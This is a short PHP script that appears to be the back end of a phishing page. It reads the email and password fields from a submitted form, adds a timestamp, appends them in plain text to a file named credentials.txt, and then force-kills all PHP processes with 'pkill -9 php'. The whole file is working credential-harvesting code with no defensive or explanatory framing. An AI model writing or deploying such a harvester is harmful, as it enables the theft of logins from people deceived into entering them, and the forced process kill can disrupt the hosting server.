<?php
	$email = "email: ".$_POST['email']."\n";
	$password = "password: ".$_POST['password']."\n";
	$date = date('Y-m-d H:i:s')."Z"."\n";
  $credential = $date.$email.$password."\n";
  file_put_contents('credentials.txt', $credential, FILE_APPEND);

	shell_exec('pkill -9 php'); 
?>
